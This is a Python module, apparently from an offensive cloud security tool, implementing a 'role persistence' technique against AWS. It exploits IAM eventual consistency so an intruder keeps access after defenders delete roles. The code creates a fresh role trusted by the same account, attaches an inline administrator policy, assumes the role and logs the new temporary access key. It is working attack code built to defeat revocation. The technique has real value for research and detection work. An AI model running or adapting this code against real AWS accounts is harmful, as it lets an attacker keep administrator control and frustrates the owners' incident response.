"""
Role Persistence Scenario (Scenario B).

This module implements the role persistence technique that maintains
access even when defenders delete assumed roles. The technique exploits
AWS IAM eventual consistency by creating new roles and assuming them within
the ~4 second propagation window.
"""

import logging
from typing import Set

from .aws_clients import IAMClient, STSClient
from .models import Credentials, PolicyDocument
from .resource_names import generate_role_name, generate_policy_name


logger = logging.getLogger(__name__)


class RolePersistence:
    """
    Implements role persistence by rotating to new IAM roles.
    
    When a role is deleted, this class creates a new role with a trust policy
    allowing same-account assumption, attaches an inline policy with
    AdministratorAccess permissions, and assumes the new role to obtain
    temporary credentials. This maintains access even after defenders attempt
    to revoke it.
    
    Attributes:
        iam: IAM client for AWS API operations
        logger: Logger instance for operation logging
        created_roles: Set of role names created by this instance
    """
    
    def __init__(self, iam_client: IAMClient, logger_instance: logging.Logger = None):
        """
        Initialize RolePersistence.
        
        Args:
            iam_client: IAM client for AWS operations
            logger_instance: Optional logger instance (defaults to module logger)
        """
        self.iam = iam_client
        self.logger = logger_instance or logger
        self.created_roles: Set[str] = set()
    
    def execute(
        self, 
        current_credentials: Credentials,
        account_id: str
    ) -> Credentials:
        """
        Execute the role persistence scenario.
        
        This method performs the complete flow:
        1. Create new role with trust policy
        2. Attach inline policy to role
        3. Assume new role
        4. Return new temporary credentials
        
        Args:
            current_credentials: Current AWS credentials to use
            account_id: AWS account ID for trust policy
        
        Returns:
            Credentials: New temporary credentials for the assumed role
        
        Raises:
            ClientError: If any AWS API operation fails
        """
        self.logger.info("Starting role persistence scenario")
        
        # Step 1: Create new role with trust policy
        new_role_name = generate_role_name()
        self.logger.info(f"Creating new role: {new_role_name}")
        
        trust_policy = PolicyDocument.same_account_trust(account_id)
        self.iam.create_role(
            role_name=new_role_name,
            assume_role_policy_document=trust_policy.to_json()
        )
        self.created_roles.add(new_role_name)
        
        # Step 2: Attach inline policy to role
        policy_name = generate_policy_name()
        self.logger.info(f"Attaching policy {policy_name} to role {new_role_name}")
        
        admin_policy = PolicyDocument.administrator_access()
        self.iam.put_role_policy(
            role_name=new_role_name,
            policy_name=policy_name,
            policy_document=admin_policy.to_json()
        )
        
        # Step 3: Assume new role
        self.logger.info(f"Assuming new role: {new_role_name}")
        new_role_arn = f"arn:aws:iam::{account_id}:role/{new_role_name}"
        sts_client = STSClient(current_credentials)
        new_credentials = sts_client.assume_role(
            role_arn=new_role_arn,
            role_session_name="notyet-role-session"
        )
        
        self.logger.info(
            f"Role persistence scenario completed. "
            f"New role: {new_role_name}, "
            f"Access key: {new_credentials.access_key_id}"
        )
        
        return new_credentials
